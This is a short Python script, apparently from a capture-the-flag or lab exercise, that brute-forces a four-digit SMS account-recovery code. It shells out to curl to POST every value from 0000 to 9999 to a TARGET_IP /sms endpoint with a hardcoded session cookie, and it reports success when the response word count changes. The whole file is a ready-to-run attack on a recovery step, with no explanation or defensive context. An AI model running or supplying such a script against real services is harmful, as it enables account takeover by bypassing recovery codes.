#sms_brute.py

import subprocess
def submit_recovery_code(session, recovery_code):

    recovery_command = [
        "curl", "-X", "POST", "http://TARGET_IP:8080/sms",
        "-d", f"sms={recovery_code}",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", f"Cookie: session={session}",
        "--silent"
    ]

    # Execute the curl command for recovery code submission
    response_recovery = subprocess.run(recovery_command, capture_output=True, text=True)
    return response_recovery.stdout

def main():
    session="eyJ1c2VybmFtZSI6ImFuZGVycyJ9.apbmUw.pEeGEjer1MRbNx5swfG9W8Z7TLQ"

    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format the recovery code as a 4-digit string

        response_text = submit_recovery_code(session, recovery_code)
        word_count = len(response_text.split())

        if word_count != 137:
            print(f"Success! Recovery Code: {recovery_code}")
            print(f"Response Text: {response_text}")
            break

if __name__ == "__main__":
    main()
